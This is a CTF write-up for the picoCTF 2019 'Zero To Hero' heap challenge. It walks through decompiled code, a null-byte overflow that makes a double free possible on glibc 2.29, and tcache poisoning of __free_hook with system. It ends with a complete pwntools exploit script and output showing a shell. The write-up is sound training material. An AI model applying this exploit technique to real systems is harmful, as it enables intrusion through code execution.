# Zero To Hero
This was a fun challenge from picoctf 2019. It was rated 500 points and had very few solves during the ctf. Although it wasn't that tough.  

## Description
Now you're really cooking. Can you pwn this service?. Connect with `nc 2019shell1.picoctf.com 49929`. [libc.so.6](https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/libc.so.6) [ld-2.29.so](https://2019shell1.picoctf.com/static/40beb534349dda031d3c84a1ac1b4710/ld-2.29.so)  

## Quick Overview
It's a 64 bit dynamically linked elf executable -
```console
root@kali:~/picoctf-2019/zero_to_hero# file ./zero_to_hero 
./zero_to_hero: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /root/picoctf-2019/ld-2.29.so, for GNU/Linux 3.2.0, BuildID[sha1]=cf8bd977ca01d23e9b004a6dc637d6ab7c56e656, stripped
```

Running checksec -
```console
root@kali:~/picoctf-2019/zero_to_hero# checksec ./zero_to_hero 
[*] '/root/picoctf-2019/zero_to_hero/zero_to_hero'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
```
Checksec shows us that Everything except PIE is enabled. We'll later see that our solution works regardless of PIE.

Running the binary -
```console
From Zero to Hero
So, you want to be a hero?
y
Really? Being a hero is hard.
Fine. I see I can't convince you otherwise.
It's dangerous to go alone. Take this: 0x7f777a154ff0
1. Get a superpower
2. Remove a superpower
3. Exit
>
```
When we run it, it asks us y/n we send y and it loads the main program. It leaks us an address (probably some libc address?).

## Decompiling & Analyzing the code

main function -
```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("From Zero to Hero");
  puts("So, you want to be a hero?");
  buf[read(0, buf, 0x14uLL)] = 0;
  if ( buf[0] != 121 )
  {
    puts("No? Then why are you even here?");
    exit(0);
  }
  puts("Really? Being a hero is hard.");
  puts("Fine. I see I can't convince you otherwise.");
  printf("It's dangerous to go alone. Take this: %p\n", &system);
  while ( 1 )
  {
    while ( 1 )
    {
      sub_400997();
      printf("> ");
      v3 = 0;
      __isoc99_scanf("%d", &v3);
      getchar();
      if ( v3 != 2 )
        break;
      sub_400BB3();
    }
    if ( v3 == 3 )
      break;
    if ( v3 != 1 )
      goto LABEL_10;
    sub_400A4D();
  }
  puts("Giving up?");
LABEL_10:
  exit(0);
}
```

create superpower -
```c
unsigned __int64 sub_400A4D()
{
  __int64 v0; // rbx
  size_t size; // [rsp+0h] [rbp-20h]
  unsigned __int64 v3; // [rsp+8h] [rbp-18h]

  v3 = __readfsqword(0x28u);
  LODWORD(size) = 0;
  HIDWORD(size) = sub_4009C2();
  if ( (size & 0x8000000000000000LL) != 0LL )
  {
    puts("You have too many powers!");
    exit(-1);
  }
  puts("Describe your new power.");
  puts("What is the length of your description?");
  printf("> ");
  __isoc99_scanf("%u", &size);
  getchar();
  if ( (unsigned int)size > 0x408 )
  {
    puts("Power too strong!");
    exit(-1);
  }
  *((_QWORD *)&unk_602060 + SHIDWORD(size)) = malloc((unsigned int)size);
  puts("Enter your description: ");
  printf("> ");
  v0 = *((_QWORD *)&unk_602060 + SHIDWORD(size));
  *(_BYTE *)(v0 + read(0, *((void **)&unk_602060 + SHIDWORD(size)), (unsigned int)size)) = 0;
  puts("Done!");
  return __readfsqword(0x28u) ^ v3;
}
```

delete superpower -
```c
unsigned __int64 sub_400BB3()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("Which power would you like to remove?");
  printf("> ");
  __isoc99_scanf("%u", &v1);
  getchar();
  if ( v1 > 6 )
  {
    puts("Invalid index!");
    exit(-1);
  }
  free(*((void **)&unk_602060 + v1));
  return __readfsqword(0x28u) ^ v2;
}
```

* Looking at the main function, it leaks the address of system as we saw earlier.
* Option 1 allows to create a super power and option 2 to delete a superpower.
* We can only create chunks with size less than 0x408 and we can create only malloc 7 times which means we are limited to tcache.
* Input is taken through the read function, So we can have null bytes in our payload.
* There is a null byte overflow bug while reading the description.
* We have a double free in the delete superpower function as the pointer is not nulled after it's freed.

## Exploitation
Now that we have a double free bug, we could simply free it twice and do tcache poisoning and all but that won't work because it's using libc 2.29 and not libc 2.27.  
There was a mitigation introduced in libc 2.28 because of which you can no longer double free chunks.

We can look at the definition of tcache_entry here - https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L2904
```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;
```

It uses the tcache_perthread_struct struct to detect double frees.
In short, when a chunk is freed it checks if its key is equal to the tcache_perthread_struct of the corresponding tcache size and then iterates over the tcache bin to check if it exists already.
If it does, it calls double free detected....

Now, one way would be to somehow nullify the key field of the chunk which is already freed. But this is not possible in our case.

But as we have a null byte overflow bug, the following can be done -
* Create two continuous chunks. (size of the second chunk should be > 0x100)
* Free the first and second chunks.
* Allocate the first chunk again.
* Use the null byte overflow on the first chunk and change the size of the second chunk.
* Now we can again free the second chunk, getting a double free.

```python
malloc(0x18,'a') # First chunk
malloc(0x118,'b') # Second chunk
malloc(0x118,'c') # third chunk (just for tcache count)

free(0) # goes to 0x20 tcache bin
free(2) # goes to 
free(1) # 0x120 tcache bin

malloc(0x18,'A'*0x18) #Allocate chunk 1 back from 0x20 tcache bin and do null byte overflow.
free(1) # chunk 2 size changed to 0x100 so we can double free it.
```

Now that we have a double free, we could simply do tcache poisoning into &__free_hook and write system.
Then freeing a chunk pointing to "/bin/sh\0" will give us a shell.

```python
malloc(0xf8,p64(libc.symbols['__free_hook'])) # tcache poisoning
malloc(0x118,'/bin/sh\x00')
malloc(0x118,p64(libc.symbols['system'])) # malloc returns &__free_hook
free(1) # system("/bin/sh")
```

Final exploit -
```python
#!/usr/bin/env python

from pwn import *

p = process('./zero_to_hero')
e = ELF('./zero_to_hero')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def malloc(size,data):
    p.sendlineafter('> ','1')
    p.sendlineafter('> ',str(size))
    p.sendafter('> ',data)

def free(idx):
    p.sendlineafter('> ','2')
    p.sendlineafter('> ',str(idx))

def die():
    p.sendlineafter('> ','3')

p.sendlineafter('?\n','y')

for i in xrange(2):
    p.recvline()

system = int(p.recvline().strip().split(' ')[-1],16)
libc.address = system-libc.symbols['system']

log.success('libc base at: '+hex(libc.address))
log.success('system at: '+hex(system))
log.success('free hook at: '+hex(libc.symbols['__free_hook']))

malloc(0x18,'a') # First chunk
malloc(0x118,'b') # Second chunk
malloc(0x118,'c') # third chunk (just for tcache count)

free(0) # goes to 0x20 tcache bin
free(2) # goes to 
free(1) # 0x120 tcache bin

malloc(0x18,'A'*0x18) #Allocate chunk 1 back from 0x20 tcache bin and do null byte overflow.
free(1) # chunk 2 size changed to 0x100 so we can double free it.

malloc(0xf8,p64(libc.symbols['__free_hook'])) # tcache poisoning
malloc(0x118,'/bin/sh\x00')
malloc(0x118,p64(libc.symbols['system'])) # malloc returns &__free_hook
free(1) # system("/bin/sh")

p.interactive()
```

Running the exploit -
```console
root@kali:~/bak/picoctf-2019/zero_to_hero# python exp.py 
[+] Starting local process './zero_to_hero': pid 965814
[*] '/root/bak/picoctf-2019/zero_to_hero/zero_to_hero'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  './'
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] libc base at: 0x7fb33f4df000
[+] system at: 0x7fb33f525ff0
[+] free hook at: 0x7fb33f69b5a8
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```
